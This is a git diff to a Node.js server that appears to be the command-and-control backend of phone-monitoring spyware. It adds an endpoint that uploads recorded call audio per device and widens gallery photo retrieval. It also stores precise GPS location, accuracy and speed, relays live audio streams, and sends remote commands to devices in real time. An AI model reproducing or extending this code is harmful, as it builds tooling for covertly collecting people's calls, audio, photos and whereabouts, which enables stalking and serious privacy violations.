@@ -77,11 +77,8 @@ io.on('connection', (socket) => {
         }
     });
 
-    // 5. Audio Stream Relay (Binary) - 🔥 DEBUGGING ADDED
+    // 5. Audio Stream Relay (Binary)
     socket.on('audio-stream', (blob) => {
-        // 👇 YE LINE BATAYEGI KI AUDIO SERVER PAR PAHUCHA YA NAHI
-        // console.log(`🔊 Audio Chunk: ${blob ? blob.length : 0} bytes`); 
-
         const rooms = socket.rooms;
         for (const room of rooms) {
             if (room !== socket.id) {
@@ -94,7 +91,7 @@ io.on('connection', (socket) => {
 });
 
 app.get('/', (req, res) => {
-    res.send('✅ Server Running: Audio Debug + Location Accuracy Fixed!');
+    res.send('✅ Server Running: Audio Upload Added + Limits Adjusted!');
 });
 
 // ==================================================
@@ -121,10 +118,52 @@ app.post('/api/upload-image', (req, res) => {
     );
 });
 
+// ✅✅ NEW: AUDIO UPLOAD ROUTE ADDED HERE ✅✅
+app.post('/api/upload-audio', (req, res) => {
+    let { device_id, audio_data, filename } = req.body; 
+    
+    if (!device_id || !audio_data) return res.status(400).json({ error: "No Data" });
+    const id = device_id.toString().trim().toUpperCase();
+    
+    // Calls Folder
+    let folderPath = `${id}/calls`; 
+
+    // Base64 check
+    let base64Audio = audio_data.startsWith('data:audio') ? audio_data : "data:audio/mp4;base64," + audio_data;
+
+    cloudinary.uploader.upload(base64Audio, 
+        { 
+            folder: folderPath, 
+            public_id: filename || Date.now().toString(), 
+            resource_type: "video" // 🔥 Cloudinary Audio ko Video maanta hai
+        }, 
+        (error, result) => {
+            if (error) {
+                console.log("Audio Upload Error:", error);
+                return res.status(500).json({ error: "Upload Failed" });
+            }
+            
+            // Dashboard pe alert bhejo
+            io.emit('new-audio', { device_id: id, url: result.secure_url, name: filename });
+            
+            res.json({ status: "success", url: result.secure_url });
+        }
+    );
+});
+
+// ✅ Gallery List Limit Increased to 100 per page for faster loading
 app.get('/api/gallery-list/:device_id', (req, res) => {
     const id = req.params.device_id.toUpperCase();
     const next_cursor = req.query.next_cursor || null;
-    cloudinary.api.resources({ type: 'upload', prefix: id + "/", max_results: 20, next_cursor: next_cursor, direction: 'desc', context: true }, 
+    
+    cloudinary.api.resources({ 
+        type: 'upload', 
+        prefix: id + "/", 
+        max_results: 100, // 🔥 Limit badha di hai (Pehle 20 thi)
+        next_cursor: next_cursor, 
+        direction: 'desc', 
+        context: true 
+    }, 
     (error, result) => {
         if (error) return res.json({ photos: [], next_cursor: null });
         const photos = result.resources.map(img => img.secure_url);
@@ -150,7 +189,6 @@ app.get('/api/device-status/:id', (req, res) => {
 
 app.post('/api/status', (req, res) => {
     try {
-        // 🔥 Added 'accuracy' and 'speed' here
         let { device_id, model, battery, level, version, charging, lat, lon, accuracy, speed } = req.body;
         if (!device_id) return res.status(400).json({ error: "No ID" });
 
@@ -171,8 +209,8 @@ app.post('/api/status', (req, res) => {
             charging: (String(charging) === "true"),
             lat: lat || (devicesStatus[id]?.lat || 0),
             lon: lon || (devicesStatus[id]?.lon || 0),
-            accuracy: accuracy || (devicesStatus[id]?.accuracy || 0), // ✅ SAVING ACCURACY
-            speed: speed || (devicesStatus[id]?.speed || 0),          // ✅ SAVING SPEED
+            accuracy: accuracy || (devicesStatus[id]?.accuracy || 0),
+            speed: speed || (devicesStatus[id]?.speed || 0),
             lastSeen: Date.now(),
             command: devicesStatus[id]?.command || "none" 
         };
@@ -184,7 +222,7 @@ app.post('/api/status', (req, res) => {
 });
 
 // ==================================================
-//  🔥 DATA STORAGE (Updated for Location Accuracy)
+//  🔥 DATA STORAGE
 // ==================================================
 
 app.post('/api/upload_data', async (req, res) => { 
@@ -197,7 +235,6 @@ app.post('/api/upload_data', async (req, res) => {
     try {
         let parsedData = typeof data === 'string' ? JSON.parse(data) : data;
 
-        // 🔥 Update Live Location Status
         if (type === 'location') {
             const locObj = Array.isArray(parsedData) ? parsedData[parsedData.length - 1] : parsedData;
             
@@ -206,8 +243,6 @@ app.post('/api/upload_data', async (req, res) => {
                 
                 devicesStatus[id].lat = locObj.lat || locObj.latitude;
                 devicesStatus[id].lon = locObj.lon || locObj.longitude || locObj.lng;
-                
-                // ✅ Capture Accuracy & Speed from Data Logs
                 devicesStatus[id].accuracy = locObj.accuracy || locObj.acc || 0;
                 devicesStatus[id].speed = locObj.speed || 0;
             }
@@ -260,9 +295,14 @@ app.post('/api/send-command', (req, res) => {
     let { device_id, command } = req.body;
     if (!device_id || !command) return res.status(400).json({ error: "Missing Info" });
     const id = device_id.toUpperCase().trim();
+    
+    // 1. Socket se live bhejo
+    io.to(id).emit('command', command);
+
+    // 2. Status mein save karo (taki agar offline ho to baad me mile)
     if (!devicesStatus[id]) devicesStatus[id] = { id: id, lastSeen: 0 };
     devicesStatus[id].command = command;
-    io.to(id).emit('command', command);
+    
     res.json({ status: "success", command: command });
 });
 
